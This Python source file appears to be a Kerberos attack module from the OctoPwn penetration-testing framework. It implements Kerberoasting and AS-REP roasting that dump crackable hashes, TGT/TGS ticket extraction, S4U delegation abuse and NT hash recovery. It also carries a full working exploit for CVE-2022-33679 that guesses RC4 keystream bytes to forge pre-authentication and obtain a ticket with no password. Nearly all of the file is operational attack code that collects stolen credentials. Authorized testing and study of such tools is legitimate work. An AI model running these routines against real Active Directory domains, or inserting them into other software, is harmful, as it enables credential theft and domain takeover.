import copy
import platform

import datetime
import base64

from aiosmb import logger
from octopwn.clients.base import ClientConsoleBase
from octopwn.common.credential import Credential
from octopwn.remote.protocol.python import kerberos_pb2
from octopwn.clients.kerberos.utils import format_kirbi
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.security import Kerberoast, APREPRoast
from minikerberos.common.utils import tgt_to_kirbi
from minikerberos.protocol.asn1_structs import AP_REQ, HostAddress, PA_ENC_TS_ENC,\
	PrincipalName, EncryptedData, HostAddress, EncryptionKey,\
	TicketFlags, KrbCredInfo, EncKrbCredPart, KRB_CRED
from asyauth.protocols.kerberos.gssapi import KRB5_MECH_INDEP_TOKEN
from minikerberos.common.utils import TGSTicket2hashcat
from minikerberos.protocol.constants import EncryptionType
from minikerberos.protocol.encryption import Key, _enctype_table


class KerberosClient(ClientConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ClientConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue,prompt, octopwnobj)
		# the connection object is in fact a tuple of KerberosCredential and KerberosTarget
		self.nologon_commands.append('any')
		self.connection = connection
		self.target = self.connection[0]
		self.credential_base = self.connection[1]
		self.credential = self.credential_base.to_ccred()
	
	async def start(self):
		return True, None

	def isint(self, x):
		try:
			x = int(x)
			return True
		except:
			return False

	async def do_kerberoast(self, spn:str, to_print:bool = True, h_token:int = None):
		"""Kerberoast user"""
		try:
			results = []
			spns = []
			if self.isint(spn) is True:
				spn = int(spn)
				client_config, ldapclient = self.octopwnobj.clients[spn]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_service_users():
					if err is not None:
						raise err
				
					credential = KerberosSPN()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name

					spns.append(credential)
					
			else:
				spns.append(KerberosSPN.from_user_email(spn))
			
			if self.credential is not None:
				for spn in spns:
					client = AIOKerberosClient(self.credential, self.target)
					if client.usercreds.nopreauth is True:
						await client.get_TGT(override_sname=spn)
						tgshash = TGSTicket2hashcat(client.kerberos_TGT)
					else:
						await client.get_TGT()
						tgs, _, _ = await client.get_TGS(spn)
						tgshash = TGSTicket2hashcat(tgs)
					results.append(tgshash)
				#kr = Kerberoast(self.target, self.credential)
				#results = await kr.run(spns)
			else:
				if platform.system() == 'Windows':
					# using SSPI
					results, errors, err = await self.kerberoast_windows(spns)
					if err is not None:
						raise err
				else:
					# using WSNET
					results, errors, err = await self.kerberoast_wsnet(spns)
					if err is not None:
						raise err
							
			for result in results:
				if to_print is True:
					await self.print(result)
				
				username = ''
				domain = ''
				try:
					username = spn.split('@')[0]
					domain = spn.split('@')[1]
				except:
					pass

				cred = Credential(username, result, 'KERBEROAST', domain=domain, source='KERBEROAST-%s' % self.client_id, description='KERBEROAST')
				_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
				if err is not None and to_print is True:
					await self.print('Failed to add kerberoast credential for user %s Reason: %s' % (username, err))
				
				if h_token is not None:
					msg = kerberos_pb2.KerberosKerberoast()
					msg.username = username
					msg.domain = domain
					msg.ticket = result
					await self.remotemsg(msg)
			
			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_asreproast(self, user:str, to_print:bool = True, h_token:int = None):
		"""ASREPRoast user. Target is expected in user@FQDN format !OR! Integer denoting an active LDAP client for automatic kerberoast."""
		try:
			results = []
			if self.isint(user) is True:
				user = int(user)
				client_config, ldapclient = self.octopwnobj.clients[user]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_knoreq_users():
					if err is not None:
						raise err
				
					credential = KerberosCredential()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name
					
					kr = APREPRoast(self.target)
					result = await kr.run(credential, override_etype = [23])
					if result is not None:
						results.append(result)
						if to_print is True:
							await self.print(result)
						
						if h_token is not None:
							msg = kerberos_pb2.KerberosASREP()
							msg.username = user.sAMAccountName
							msg.domain = ldapclient.domain_name
							msg.ticket = result
							await self.remotemsg(msg)


			else:
				user, domain = user.split('@',1)
				credential = KerberosCredential()
				credential.username = user
				credential.domain = domain

				kr = APREPRoast(self.target)
				result = await kr.run(credential, override_etype = [23])
				if result is not None:
					results.append(result)
					if to_print is True:
						await self.print(result)
					
					cred = Credential(user, result, 'ASREPROAST', domain=domain, source='ASREPROAST-%s' % self.client_id, description='ASREPROAST')
					_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
					if err is not None and to_print is True:
						await self.print('Failed to add asreproast credential for user %s Reason: %s' % (user, err))
					
					if h_token is not None:
						msg = kerberos_pb2.KerberosASREP()
						msg.username = user
						msg.domain = domain
						msg.ticket = result
						await self.remotemsg(msg)

			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_tgt(self, etype=None, to_print:bool = True, h_token:int = None):
		"""Obtains TGT for current user"""
		try:
			if self.credential is None:
				raise Exception('SSPI and WSNET not supported here!')
			if etype is None or etype == '':
				etype = [23,17,18]
			else:
				etype = [int(etype)]
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT(override_etype=etype)
			kirbi = tgt_to_kirbi(connection.kerberos_TGT, connection.kerberos_TGT_encpart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))

			cred = Credential(self.credential.username, base64.b64encode(kirbi).decode(), 'kirbib64', domain=self.credential.domain, source='TGT-%s' % self.client_id, description='TGT')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add asreproast credential for user %s Reason: %s' % (self.credential.username, err))
			
			if h_token is not None:
				msg = kerberos_pb2.KerberosTGT()
				msg.username = self.credential.username
				msg.domain = self.credential.domain
				msg.ticket = format_kirbi(kirbi).replace(' ', '')
				await self.remotemsg(msg)

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_tgs(self, spn:str, to_print:bool = True, h_token:int = None):
		"""Gets TGS for SPN"""
		try:
			if spn.find('@') != -1:
				kspn = KerberosSPN.from_user_email(spn)
			else:
				kspn = KerberosSPN.from_target_string(spn)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			tgs, encTGSRepPart, key = await connection.get_TGS(kspn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))

			cred = Credential(kspn.username, base64.b64encode(kirbi).decode(), 'kirbib64', domain=kspn.domain, source='TGS-%s' % self.client_id, description='TGS')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add asreproast credential for user %s Reason: %s' % (kspn.username, err))
			
			if h_token is not None:
				msg = kerberos_pb2.KerberosTGS()
				msg.username = kspn.username
				msg.domain = kspn.domain
				msg.ticket = format_kirbi(kirbi).replace(' ', '')
				await self.remotemsg(msg)

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_s4uproxy(self, spn, targetuser, to_print = True):
		"""S4U proxy. SPN: spn format. targetuser: user@FQDN format"""
		try:
			service_spn = KerberosSPN.from_target_string(spn)
			target_user = KerberosSPN.from_user_email(targetuser)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			logger.debug('Getting ST')
			tgs, encTGSRepPart, key = await connection.getST(target_user, service_spn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))
			
			cred = Credential(target_user.username, format_kirbi(kirbi).replace(' ', ''), 'TGS', domain=target_user.domain, source='TGS-%s' % self.client_id, description='TGS')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add credential for user %s Reason: %s' % (target_user.username, err))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_s4uself(self, targetuser:str, to_print=True):
		"""S4U Self. targetuser: user@FQDN format"""
		try:
			target_user = KerberosSPN.from_user_email(targetuser)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			logger.debug('Getting ST')
			tgs, encTGSRepPart, key = await connection.S4U2self(target_user)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))
			
			cred = Credential(target_user.username, base64.b64encode(kirbi).decode(), 'TGS', domain=target_user.domain, source='S4U-%s' % self.client_id, description='S4U')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add credential for user %s Reason: %s' % (target_user.username, err))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_nt(self):
		"""Gets NT hash from a PKINIT (cert) auth"""
		try:
			client = AIOKerberosClient(self.credential, self.target)
			tgs, enctgs, key, decticket = await client.U2U()
			results = client.get_NT_from_PAC(decticket)
			for result in results:
				await self.print('%s : %s' % (result[0], result[1]))
				if result[0] == 'NT':
					cred = Credential(
						self.credential.username, 
						result[1], 
						'NT',
						domain=self.credential.domain
					)
					await self.octopwnobj.addcredential_obj(cred, to_print=False)


			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e


	async def kerberoast_windows(self, targets:str):
		try:
			if platform.system() != 'Windows':
				await self.print('[-]This command only works on Windows!')
				return None, None, Exception('[-]This command only works on Windows!')
			try:
				from winsspi.sspi import KerberoastSSPI
				from minikerberos.common.utils import TGSTicket2hashcat
			except ImportError:
				return None, None, Exception('winsspi module not installed!')

			results = []
			errors = []
			for cred in targets:
				try:
					spn_name = str(cred)
					ksspi = KerberoastSSPI()
					try:
						ticket = ksspi.get_ticket_for_spn(spn_name)
					except Exception as e:
						errors.append((spn_name, e))
						continue
					results.append(TGSTicket2hashcat(ticket))
				except Exception as e:
					print("spnroast-sspi for user %s failed. Reason: %s" % (cred, e))
			
			return results, errors, None
		except Exception as e:
			return None, None, e
	
	async def kerberoast_wsnet(self, targets):
		try:
			if platform.system() != 'Emscripten':
				await self.print('[-]This command only works in the browser!')
				return None, None, Exception('[-]This command only works in the browser!')
			try:
				from wsnet.pyodide.clientauth import WSNETAuth
				from minikerberos.common.utils import TGSTicket2hashcat
			except ImportError:
				return None, None, Exception('winsspi module not installed!')

			results = []
			errors = []
			for cred in targets:
				try:
					wa = WSNETAuth()
					await wa.setup()
					status, ctxattr, authdata, err = await wa.authenticate('KERBEROS', '<CURRENT>', str(cred), 3, 0, b'')#credusage, flags, authdata)
					if err is not None:
						raise err
					unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(authdata)
					aprep = AP_REQ.load(unwrap.data[2:]).native
					results.append(TGSTicket2hashcat(aprep))
				except Exception as e:
					print("spnroast-wsnet for user %s failed. Reason: %s" % (cred, e))
			
			return results, errors, None
		except Exception as e:
			return None, None, e
	
	async def do_cve202233679(self, to_print:bool = True, h_token:int = None):
		try:
			def byte_xor(ba1, ba2):
				return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

			def get_padding_data():
				# for the attack to work, we need a TGT with a larger-than-normal AS-REP enc-data
				# we achieve this by adding a lot of hostaddresses in the AS-REQ, 
				# which will be reflected in the AS-REP
				hosts = []
				for x in range(50):
					hd = {
						'addr-type' : 1,
						'address' : b'\x00'*2 + x.to_bytes(2, byteorder='big', signed=False)
					}
					hosts.append(HostAddress(hd))
				return hosts

			def calc_known_plaintext(cipher):
				# returns the known values for the initial structure which depends on the length
				# original data starts with 24 bytes of \x00 then the ASN1 struct
				# the first 24 bytes is where the cofounder and mac should be but in this case it's just zeroes
				cipher_length = len(cipher)
				if cipher_length <= 127:
					raise Exception('NO')
				header_length = 24
				data_length = cipher_length - header_length
				first_len = data_length - 4
				second_len = first_len - 4
				return b'\x00'*24 + b'\x79\x82' + first_len.to_bytes(2, byteorder='big', signed=False) + b'\x30\x82'+ second_len.to_bytes(2, byteorder='big', signed=False) +b'\xA0\x1B\x30\x19\xA0\x03\x02\x01\x80\xA1\x12\x04\x10'

			def get_crafted_timestamp(n, now):
				# manually crafting a timestamp field for this exploit to work is an 
				# interesting yet painful thing to do.
				# See the writeup for more info, it's too long to explain here
				now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
				nowstr = now.strftime('%Y%m%d%H%M%SZ')
				t = nowstr.encode() + b'\x00'
				tt = b'\x18'+len(t).to_bytes(1, byteorder='big', signed=False) + t
				ts_end = b'\xA0' + len(tt).to_bytes(1, byteorder='big', signed=False) + tt
				if n == 0:
					timestamp = b'\x30' + len(ts_end).to_bytes(1, byteorder='big', signed=False) + ts_end
				else:
					x = (0x80 + n).to_bytes(1, byteorder='big', signed=False) + b'\x00'*(n-1) + len(ts_end).to_bytes(1, byteorder='big', signed=False)
					timestamp = b'\x30'+ x + ts_end

				return timestamp

			def tgt_to_kirbi_md4(tgt, sessionkey, now):
				keyd = {
					'keytype': -128, 
					'keyvalue': sessionkey
				}

				ci = {}
				ci['key'] = EncryptionKey(keyd)
				ci['prealm'] = tgt['crealm']
				ci['pname'] = tgt['cname']
				ci['flags'] = TicketFlags(set(['enc-pa-rep', 'forwardable', 'renewable', 'initial', 'proxiable'])) #guessing...
				ci['authtime'] = now
				ci['starttime'] = now
				ci['endtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
				ci['renew-till'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
				ci['srealm'] = tgt['crealm'] # guessing! modify this if not valid....
				ci['sname'] = PrincipalName({'name-type': 1, 'name-string': ['krbtgt', tgt['crealm']]})

				ti = {}
				ti['ticket-info'] = [KrbCredInfo(ci)]

				te = {}
				te['etype']  = 0
				te['cipher'] = EncKrbCredPart(ti).dump()

				t = {}
				t['pvno'] = 5
				t['msg-type'] = 22
				t['enc-part'] = EncryptedData(te)
				t['tickets'] = [tgt['ticket']]

				return KRB_CRED(t)
			
			await self.print('[+] FETCHING TGT...')
			client = AIOKerberosClient(self.credential, self.target)
			padding_data = {
				'addresses' : get_padding_data()
			}
			craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, kdc_req_body_extra=padding_data, no_preauth=True)
			rep = await client.ksoc.sendrecv(craftticket.dump())
			tgt = rep.native
			await self.print('[+] GOT TGT...')
			
			now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
			timestamp = PA_ENC_TS_ENC({'patimestamp': now.replace(microsecond=0)}).dump() #
			
			cipher_data = tgt['enc-part']['cipher']
			plaintext_data = calc_known_plaintext(cipher_data)
			cipher_data_header = cipher_data[:len(plaintext_data)]
			await self.print('[+] PLAINTEXT FRAGMENT: %s ' % plaintext_data.hex())
			keystream = byte_xor(cipher_data_header, plaintext_data)
			await self.print('[+] PARTIAL KEYSTREAM : %s' % keystream.hex())
			
			# verifying the guessed partial keystream by requesting a TGT but this time with pre-auth
			# the pre-auth will need the encrypted timestamp which we can forge with the partial keystream 
			await self.print('[+] VERIFYING KEYSTREAM...')
			await self.print('[i] TIMESTAMP    : %s' % timestamp.hex())
			enc_timestamp = byte_xor(b'\x00'*24+timestamp, keystream)
			await self.print('[i] ENC TIMESTAMP: %s' % enc_timestamp.hex())
			craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, enctimestamp=enc_timestamp, newnow=now)
			#print('[i] CRAFTED AS-REQ: %s' % craftticket.dump().hex())
			rep = await client.ksoc.sendrecv(craftticket.dump())
			rep = rep.native
			if rep['msg-type'] == 30:
				await self.print('[-] FAILED! Keystream is not good')
				return

			await self.print('[+] PARTIAL KEYSTREAM WORKS! Got code : %s' % rep['msg-type'])
			await self.print('[+] GUESSING REMAINING KEYSTREAM BYTES...')
			ctr = 0
			orig_keystream_len = len(keystream)
			for tslen in range(0,4): #5 is minumum
				for byteguess in range(256):
					ctr += 1
					byteguess = byteguess.to_bytes(1, byteorder='big', signed=False)
					keystream_guess = keystream + byteguess
					timestamp = get_crafted_timestamp(tslen, now)
					#print('TIMESTAMP ASCII  : %s' % timestamp)
					#print('TIMESTAMP        : %s' % timestamp.hex())
					#print('GUESSED KEYSTREAM: %s' % (keystream_guess).hex())
					enc_timestamp = byte_xor(b'\x00'*24+timestamp, keystream_guess)
					#print('ENC TIMESTAMP    : %s' % enc_timestamp.hex())
					craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, enctimestamp=enc_timestamp, newnow=now)
					#print('CRAFTED AS-REQ: %s' % craftticket.dump().hex())
					rep = await client.ksoc.sendrecv(craftticket.dump())
					rep = rep.native
					if rep['msg-type'] == 30:
						#print('Guessed wrong...')
						continue
					
					await self.print('[+] Correctly guessed keystream byte position %s: 0x%s' % (hex(orig_keystream_len+tslen), byteguess.hex()))
					keystream = keystream_guess
					break
				else:
					await self.print('All guesses failed!!!')
					return

			await self.print('[+] GUESSED KEYSTREAM IN %s ITERATIONS' % ctr)
			now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
			timestamp = PA_ENC_TS_ENC({'patimestamp': now.replace(microsecond=0)}).dump() #
			
			#creating timestamp asn1
			await self.print('[+] REQUESTING FRESH TGT')
			enc_timestamp = byte_xor(b'\x00'*24+timestamp, keystream)
			craftticket = client.build_asreq_lts(EncryptionType.ARCFOUR_MD4, enctimestamp=enc_timestamp, newnow=now)
			rep = await client.ksoc.sendrecv(craftticket.dump())
			rep = rep.native
			if rep['msg-type'] == 30:
				await self.print('FAILED! Keystream is not good :(')
				return

			await self.print('[+] DECRYPTING AS-REP WITH KEYSTREAM')
			dec_data = byte_xor(rep['enc-part']['cipher'], keystream)
			session_key = dec_data[43:48] + b'\xAB' * 11
			await self.print('[+] FOUND SESSION KEY: %s' % session_key.hex())

			client.kerberos_TGT = rep
			client.kerberos_cipher = _enctype_table[-128]
			client.kerberos_cipher_type = -128
			client.kerberos_session_key = Key(-128, session_key)
			
			kirbi = tgt_to_kirbi_md4(rep, session_key, now).dump()
			await self.print('[+] KIRBI DATA:')
			if to_print is True:
				await self.print(format_kirbi(kirbi).replace(' ', ''))

			cred = Credential(self.credential.username, base64.b64encode(kirbi).decode(), 'kirbib64', domain=self.credential.domain, source='TGT-%s' % self.client_id, description='TGT')
			_, err = await self.octopwnobj.addcredential_obj(cred, to_print=False)
			if err is not None and to_print is True:
				await self.print('Failed to add TGT credential for user %s Reason: %s' % (self.credential.username, err))
			
			if h_token is not None:
				msg = kerberos_pb2.KerberosTGT()
				msg.username = self.credential.username
				msg.domain = self.credential.domain
				msg.ticket = format_kirbi(kirbi).replace(' ', '')
				await self.remotemsg(msg)

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e